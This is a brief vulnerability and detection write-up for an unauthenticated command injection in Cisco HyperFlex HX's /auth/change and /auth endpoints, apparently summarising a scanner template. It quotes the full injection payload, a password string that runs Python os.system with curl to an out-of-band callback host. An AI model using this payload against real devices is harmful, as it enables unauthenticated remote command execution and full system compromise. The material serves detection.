## Vulnerability
Cisco HyperFlex HX Data Platform's web-based management interface contains command injection vulnerabilities (CWE-78) in authentication handling that allow an unauthenticated remote attacker to achieve remote command execution. The flaw is present at the /auth/change and /auth endpoints.

CVSS v3.1 score 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). EPSS 0.94363 (99.96th percentile). Impact includes arbitrary command execution on the device leading to full system compromise.

## PoC / Detection
Classification: rce

The template detects the flaw by issuing two sequential raw POST requests to /auth/change and /auth. Both use username=root and a password payload `123",""$6$$)); import os;os.system("curl http://{{interactsh-url}} -H \"User-Agent: {{useragent}}\"");print(crypt.crypt("` that injects Python code to trigger an out-of-band HTTP callback. Success is confirmed by interactsh matchers verifying the HTTP protocol interaction and the exact random User-Agent string in the callback request.
